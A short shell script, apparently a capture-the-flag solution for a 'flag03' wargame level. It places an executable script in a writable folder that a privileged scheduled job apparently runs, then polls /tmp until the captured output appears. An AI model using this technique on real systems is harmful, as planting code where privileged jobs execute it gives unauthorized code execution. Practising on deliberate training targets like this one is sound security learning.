echo "getflag > /tmp/out.x" > /home/flag03/writable.d/script
chmod +x /home/flag03/writable.d/script
while [ ! -f /tmp/out.x ]; do
  printf "."
  sleep 2
done
printf "\n\n"
cat /tmp/out.x
exit 0
